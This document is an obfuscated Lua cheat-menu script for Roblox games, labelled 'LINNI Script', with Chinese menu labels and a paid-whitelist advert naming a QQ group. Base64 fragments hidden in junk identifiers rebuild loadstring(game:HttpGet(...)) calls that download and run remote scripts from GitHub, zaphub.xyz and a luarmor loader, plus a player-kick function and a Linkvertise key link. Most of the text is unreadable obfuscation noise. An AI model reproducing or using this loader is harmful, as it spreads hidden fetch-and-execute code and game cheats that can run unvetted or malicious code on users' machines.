Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('lfJgvxiEmiDDxUGGtrbyWDpQkPUBeDpJKAwnnXvHmIzJOdEqlYnsUTgesStUTGLCzPiPrtLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')起床vapetZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('JdahkzwysCVFfgJIQZiIqMMzIfpgvCNYpaExUIPfnQznnVPXggbLQblzdxDnRgSkZqAgrwLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.luatZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('kXLtgXflXoVsjMIJBMoRurloQyeLbgeITIWWRjgyRAFlMOtxIqUgzmnrDwcgPgHMnWnqajLCB0cnVlKSkoKQ0KZW5kKQ0KDQpsb2NhbCBjcmVkcyA9IHdpbmRvdzpUYWIo')RELEASE + EVENT The Heroes SimulatortZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('nQCfkirSMzaFjwmBvmuhqHUvMgnKCjNDmOZSBUfomXlPyjuCMXQdNcAoNcnmgQYpCKLPpeLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('kjQCDVgENXrkOTACpVAQinHfyajbNCPsvFAtWmVVIdNQptrkctxVMsVLuFqigAxoFYNJTqKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('rkGHptzUOsXZbqBKWxatKVZeubYKzbSNjvnCqNqPAMLtVFPjMFpaLbxUzUYwqJTTotiWAtLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')Demonic HUB V2脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('sBxZvaqFcNDrbQQHAOIvDehxmGxOFtHdwRyaMrIumEzhlDyhixeCpXvynDowOSaAYcwuBeLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/Alan0947383/Demonic-HUB-V2/main/S-C-R-I-P-T.luatZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('qNufWFRVjMwzzpfbzciggVCDtHYUlWPHtuxxhQTohDmYouWyTRlxKyLcsOtEqUODjPKsbzLHRydWUpKSgpDQplbmQpDQoNCmxvY2FsIGNyZWRzID0gd2luZG93OlRhYig=')ZapHub The Best PS99 Script (Fast Version) tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('pXNIKCqtCuhcnWyjZRcGHMbqEwCJTRrecOMNbyEoGYqhlmxwqFbwdaLMtfmRZOaqESbdnqLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('aaDMKQrETgzWkhoLMeEZirRZLTsxqqnwnYhpWDONyCPxvYRatPdeJJIpDKthrbDhajiJUYKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')密钥链接https://linkvertise.com/608384/zaphub-key-systemtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('dsuNpDUdibCiMaAaRzdHkqPECaAOTKOxrsQkwZhwegZuhVwhmlCpSqFfABMsNYePlFaccbLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')ZapHub The Best PS99 Script (Fast Version) tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ctHuFFxlQdANhPaVGWrJBqLeyKKdFqJkvxGxQFRgRyIzkxNjCYwPryeXJKYvxiZVcTCcKPLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://www.zaphub.xyz/ExecPS99FVtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('GdJiFJdbEMXPbzLzkKmojJttLWTFkkqgmWSezkPWUyMxdNRFmPIGRlggQEUjqWyXeyjaxDKSkoKQ0KZW5kKQ0KDQpsb2NhbCBjcmVkcyA9IHdpbmRvdzpUYWIo')超级联赛足球tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ILSPWozavdvECKOViTIRmUIleWfIwGtQobZjJKEpjxZDxfsrEndvIBCWsJriBBsPAiNygyLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('AqjkRjYuqEGHIaekWbQDEfKkGBgJoPMejdoYgncMXvDUDJbLzhEgcppQXnJwGUbDMZpKWbKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')踢足球tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('nKoUnxDTfbGjSYYwZgFFyqgVdEXacxkxmzXGTrPWSOuvWVRbPJgBELEHNcNPWociJSiufLLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')菜单一tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('nHflaHyfBvboCgBfbLANAiGgCKuoyJmpcJVERgMSAbnSarxgDkMxAWDfXznDKQijflldQXLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://api.luarmor.net/files/v3/loaders/8fdf7c482d3b3d108ccdb282a7fc35e2.luatZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('bWcqtdQApxftcrSqvWmTEOAmmtkVYgvvlPkxUbbpuwCsGytetHbSuHRPXeCgVEKjADlMtZKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')菜单二tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('LEkFXJKmATYtavZIzZhTyZCylYdCScrRDlpwOQPIjZIuGLgXCVlKDDvrPduKCHPfgcPTTOLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldA==')https://raw.githubusercontent.com/xtrey10x/xtrey10x-hub/main/neotZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('JhqIWqEooXZlTViIEyCpgkACcyuhbNLvnqqCoyGvUHXnHyCbgkscJvArYVmmyOMNKTKZmWKSgpDQplbmQpDQplbHNlDQpnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXI6S2ljayg=')『LINNI Script』要白名单，霖溺脚本持续更新，脚本良心三元，进群932613422找管理霖溺买，由于左边列表不能添加服务器了，所以在本脚本里面加个后续，在作者脚本里面看')--踢人函数
    end
+    
